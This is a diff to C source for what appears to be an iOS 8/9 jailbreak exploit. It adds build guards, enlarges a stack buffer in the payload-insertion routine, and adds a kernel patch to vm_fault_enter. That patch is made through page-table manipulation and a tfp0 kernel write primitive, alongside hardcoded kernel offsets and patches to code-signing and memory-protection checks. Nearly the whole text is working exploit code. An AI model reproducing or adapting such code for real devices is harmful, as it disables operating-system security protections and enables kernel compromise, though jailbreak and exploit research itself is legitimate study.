@@ -294,6 +294,7 @@ uint32_t koffsets_S5L894xX_12H321[] = {
     0,
 };
 
+#ifndef IOS_VIII_UNTETHER
 uint32_t koffsets_S5L8950X_13A452[] = {
     0x31e7bc,   // OSSerializer::serialize
     0x320f00,   // OSSymbol::getMetaClass
@@ -332,6 +333,7 @@ uint32_t koffsets_S5L8950X_13A452[] = {
     0x802af740, // csops_addr
     0x8075765a, // amfi_file_check_mmap
 };
+#endif
 
 uint32_t koffset(enum koffsets offset){
     if (offsets == NULL) {
@@ -372,12 +374,13 @@ void offsets_init(void){
         printf("S5L8945X: 12H321\n");
         offsets = koffsets_S5L894xX_12H321;
     }
-    
+#ifndef IOS_VIII_UNTETHER
     if (strcmp(u.version, "Darwin Kernel Version 15.0.0: Thu Aug 20 13:11:13 PDT 2015; root:xnu-3248.1.3~1/RELEASE_ARM_S5L8950X") == 0) {
         printf("S5L8950X: 13A452\n");
         offsets = koffsets_S5L8950X_13A452;
         isIOS9 = 1;
     }
+#endif
 }
 
 void init(void){
@@ -508,7 +511,8 @@ uint32_t leak_kernel_base(void){
 void *insert_payload(void *ptr) {
     char stackAnchor;
     uint32_t bufpos; // unsigned int size;
-    char buffer[4096];
+    //char buffer[4096];
+    char buffer[5120];
     int v26;
     mach_port_t connection;
     kern_return_t result;
@@ -949,6 +953,7 @@ void unjail8(uint32_t kbase){
     uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1(kbase, kdata, ksize);
     uint32_t PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2(kbase, kdata, ksize);
     uint32_t p_bootargs = kbase + find_p_bootargs(kbase, kdata, ksize);
+    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch_84(kbase, kdata, ksize);
     uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
     uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
     uint32_t mount_patch = kbase + find_mount(kbase, kdata, ksize) + 1;
@@ -965,6 +970,7 @@ void unjail8(uint32_t kbase){
     printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
     printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
     printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
+    printf("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
     printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
     printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
     printf("[PF] mount_patch:                %08x\n", mount_patch);
@@ -991,6 +997,10 @@ void unjail8(uint32_t kbase){
     
     /* bootArgs */
     patch_bootargs(p_bootargs);
+    
+    /* vm_fault_enter */
+    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
+    write_primitive_dword_tfp0(vm_fault_enter, 0x2201bf00);
     
     /* vm_map_enter */
     patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
@@ -1082,6 +1092,7 @@ void unjail8(uint32_t kbase){
     
 }
 
+#ifndef IOS_VIII_UNTETHER
 void unjail9(uint32_t kbase, uint32_t slide){
     printf("[*] jailbreaking...\n");
     
@@ -1257,6 +1268,7 @@ void unjail9(uint32_t kbase, uint32_t slide){
     printf("enable patched.\n");
     
 }
+#endif
 
 void load_jb(int isIOS9){
     
@@ -1322,7 +1334,9 @@ int main(void){
         if(!isIOS9){
             unjail8(kernel_base);
         } else {
+#ifndef IOS_VIII_UNTETHER
             unjail9(kernel_base, (uint32_t)(kernel_base - KERNEL_BASE_ADDRESS));
+#endif
         }
         load_jb(isIOS9);
         
